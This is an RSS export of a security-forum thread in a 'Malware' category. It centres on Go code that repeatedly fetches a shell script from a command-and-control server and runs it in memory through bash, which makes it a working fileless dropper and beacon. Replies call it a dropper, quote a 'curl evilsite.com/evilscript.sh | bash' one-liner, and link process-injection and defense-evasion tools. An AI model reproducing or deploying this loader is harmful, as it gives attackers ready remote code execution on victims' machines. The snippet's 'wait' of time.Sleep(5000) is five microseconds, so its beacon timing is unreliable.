<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>[GoLang] Executing fileless scripts</title>
    <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794</link>
    <description>Hi folks!

Some days ago I was wondering some new ideia to code in Go, and I had this idea: Something similar to powershell &quot;DownloadString&quot; but for Linux environment!

Its very simple, the code read you shellscript body from your C&amp;C, keep it in memory (within a variable), then execute directly in bash.
I didn&#39;t test deeply, did some basic tests, and worked.

```
package main

import (
    &quot;io/ioutil&quot;
    &quot;net/http&quot;
    &quot;os/exec&quot;
    &quot;time&quot;
)

func main() {
    for {
        url := &quot;http://my_command_control:8080/executeThisScript&quot; // Download your bash script
        resp, _ := http.Get(string(url))
        defer resp.Body.Close()

        shellScriptBody, _ := ioutil.ReadAll(resp.Body) // keep in memory

        cmd := exec.Command(&quot;/bin/bash&quot;, &quot;-c&quot;, string(shellScriptBody))
        cmd.Start()                                                     // run in background

        time.Sleep(5000) // wait for the next beacoming
    }
}
```

Example of dumb shell to PoC: 

```
#!/bin/bash

if [ ! -d /tmp/testDir ]; then
mkdir /tmp/testDir
fi

cd /tmp/testDir
touch test.sh
ifconfig &gt; ifconfig.log
```</description>
    
    <lastBuildDate>Mon, 04 Apr 2022 09:23:03 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/12">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/12</link>
        <pubDate>Sun, 10 Apr 2022 07:21:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-12</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[jhangju]]></dc:creator>
        <description><![CDATA[
            <p>yes it is correct . We also used it.</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/11</link>
        <pubDate>Mon, 04 Apr 2022 09:23:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-11</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[GeneralSEC]]></dc:creator>
        <description><![CDATA[
            <p>i had talked to a go evasion tool developer, he had mentioned golang provides it’s own syscalls. If anyone known/ can clarify on that I would greatly appreciate it.<br>
an interesting link down that rabbit hole - <a href="http://golang.org/x/sys" rel="noopener nofollow ugc">golang.org/x/sys</a></p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/10</link>
        <pubDate>Sun, 03 Apr 2022 18:21:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-10</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[jhangju]]></dc:creator>
        <description><![CDATA[
            <p>Well, you can also inject to any other process and your payload will be used as a legitimate process.</p>
<p>This is the project :<a href="https://github.com/Jhangju/goLang-injectors" class="inline-onebox" rel="noopener nofollow ugc">GitHub - Jhangju/goLang-injectors: This project will guide yout to awareness of injection in almost every window API and process.</a><br>
This guy give demo and experiment : <a href="https://osamaellahi.medium.com/the-art-of-defense-evasion-part-2-endpoint-evasion-a916000b57f7" class="inline-onebox" rel="noopener nofollow ugc">The art of defense evasion -part-2 — Endpoint evasion | by Osama Ellahi | Mar, 2022 | Medium</a></p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/9</link>
        <pubDate>Sat, 02 Apr 2022 11:42:01 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-9</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Nice, I think I’ll make good use of this in a red team sometime.</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/8</link>
        <pubDate>Wed, 09 Feb 2022 01:36:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-8</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[newline]]></dc:creator>
        <description><![CDATA[
            <p>I don’t mean to bash (pun not intended), but how is this better/different than a simple: <code>curl evilsite.com/evilscript.sh | bash</code> ?</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/7</link>
        <pubDate>Mon, 07 Feb 2022 16:03:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-7</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[0xe]]></dc:creator>
        <description><![CDATA[
            <p>See also <a href="https://github.com/ariary/fileless-xec" rel="noopener nofollow ugc">fileless-xec</a> for a dropper in golang.</p>
<ul>
<li>Does not write binary in memory</li>
<li>Supports HTTP3, ICMP, ~Cross-platform</li>
<li>Server and client mode</li>
</ul>
<p>The difference is that it executes binary instead of shell command. But there is a hacky workaround (<a href="https://github.com/ariary/fileless-xec/blob/main/usage.md#execute-a-shell-script" rel="noopener nofollow ugc">see</a></p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/6</link>
        <pubDate>Mon, 31 Jan 2022 07:19:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-6</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[Sea]]></dc:creator>
        <description><![CDATA[
            <p>I’ve been seeing more malware samples written in Go, this post is making me think I need to check it out!</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/5</link>
        <pubDate>Sun, 16 Jan 2022 04:34:22 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-5</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[JohnRyk]]></dc:creator>
        <description><![CDATA[
            <p>I think it a simple dropper</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/4</link>
        <pubDate>Wed, 22 Dec 2021 02:36:07 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-4</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[sagitari0]]></dc:creator>
        <description><![CDATA[
            <p>yeah, its just a way to execute it in Go.<br>
Instead PHP, Go can be compiled in ELF file, PHP cant be compiled ELF.<br>
But what I coded, can be done in PHP also.</p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/3</link>
        <pubDate>Thu, 09 Dec 2021 20:37:51 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-3</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[BlueArc]]></dc:creator>
        <description><![CDATA[
            <p>Well, it’s quite similar to execute system command from “<a class="mention" href="https://0x00sec.org/u/system">@system</a>(‘cmd’)” in PHP. It fits for windows and linux os. <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=10" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"></p>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/2</link>
        <pubDate>Thu, 09 Dec 2021 15:58:14 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-2</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
      <item>
        <title>[GoLang] Executing fileless scripts</title>
        <dc:creator><![CDATA[sagitari0]]></dc:creator>
        <description><![CDATA[
            <p>Hi folks!</p>
<p>Some days ago I was wondering some new ideia to code in Go, and I had this idea: Something similar to powershell “DownloadString” but for Linux environment!</p>
<p>Its very simple, the code read you shellscript body from your C&amp;C, keep it in memory (within a variable), then execute directly in bash.<br>
I didn’t test deeply, did some basic tests, and worked.</p>
<pre><code class="lang-auto">package main

import (
    "io/ioutil"
    "net/http"
    "os/exec"
    "time"
)

func main() {
    for {
        url := "http://my_command_control:8080/executeThisScript" // Download your bash script
        resp, _ := http.Get(string(url))
        defer resp.Body.Close()

        shellScriptBody, _ := ioutil.ReadAll(resp.Body) // keep in memory

        cmd := exec.Command("/bin/bash", "-c", string(shellScriptBody))
        cmd.Start()                                                     // run in background

        time.Sleep(5000) // wait for the next beacoming
    }
}
</code></pre>
<p>Example of dumb shell to PoC:</p>
<pre><code class="lang-auto">#!/bin/bash

if [ ! -d /tmp/testDir ]; then
mkdir /tmp/testDir
fi

cd /tmp/testDir
touch test.sh
ifconfig &gt; ifconfig.log
</code></pre>
          <p><a href="https://0x00sec.org/t/golang-executing-fileless-scripts/27794/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/golang-executing-fileless-scripts/27794/1</link>
        <pubDate>Thu, 09 Dec 2021 15:20:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-27794-1</guid>
        <source url="https://0x00sec.org/t/golang-executing-fileless-scripts/27794.rss">[GoLang] Executing fileless scripts</source>
      </item>
  </channel>
</rss>
